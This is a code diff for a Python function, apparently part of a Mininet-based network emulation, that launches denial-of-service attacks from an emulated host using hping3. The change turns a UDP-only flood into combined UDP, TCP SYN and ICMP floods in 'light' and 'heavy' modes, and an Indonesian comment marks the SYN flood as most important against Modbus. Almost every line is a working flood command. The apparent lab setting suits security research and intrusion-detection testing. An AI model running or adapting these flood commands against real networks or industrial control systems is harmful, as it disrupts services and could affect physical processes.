@@ -122,23 +122,52 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
     host_log_q = host_log.replace("\\", "/")
     h5.cmd(f"mkdir -p {os.path.dirname(host_log_q)}")
 
-    h5.cmd("pkill -f hping3")
+    h5.cmd("killall hping3")
 
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     if mode == "light":
-        print("Running LIGHT DoS (Controlled UDP flood)")
+        print("Running LIGHT DoS (Controlled mixed traffic)")
         h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> {host_log_q}")
+
+        # UDP ringan
         h5.cmd(
-            f"hping3 --udp -p {target_port} -i u50 {target_ip} "
+            f"hping3 --udp -I h5-eth1 -p {target_port} -i u100 {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
-    elif mode == "heavy":
-        print("Running HEAVY DoS (Full UDP flood)")
-        h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
+        # TCP SYN ringan (ganggu koneksi)
         h5.cmd(
-            f"hping3 --udp --flood -p {target_port} {target_ip} "
+            f"hping3 -S -I h5-eth1 -p {target_port} -i u200 {target_ip} "
+            f">> {host_log_q} 2>&1 &"
+        )
+
+        # ICMP ringan (naikin RTT)
+        h5.cmd(
+            f"hping3 --icmp -I h5-eth1 -i u200 {target_ip} "
+            f">> {host_log_q} 2>&1 &"
+        )
+
+
+    elif mode == "heavy":
+        print("Running HEAVY DoS (Full mixed flood)")
+        h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
+
+        # UDP flood (bandwidth killer)
+        h5.cmd(
+            f"hping3 --udp --flood -I h5-eth1 -p {target_port} {target_ip} "
+            f">> {host_log_q} 2>&1 &"
+        )
+
+        # TCP SYN flood (paling penting buat Modbus)
+        h5.cmd(
+            f"hping3 -S --flood -I h5-eth1 -p {target_port} {target_ip} "
+            f">> {host_log_q} 2>&1 &"
+        )
+
+        # ICMP flood (tambahan delay)
+        h5.cmd(
+            f"hping3 --icmp --flood -I h5-eth1 {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
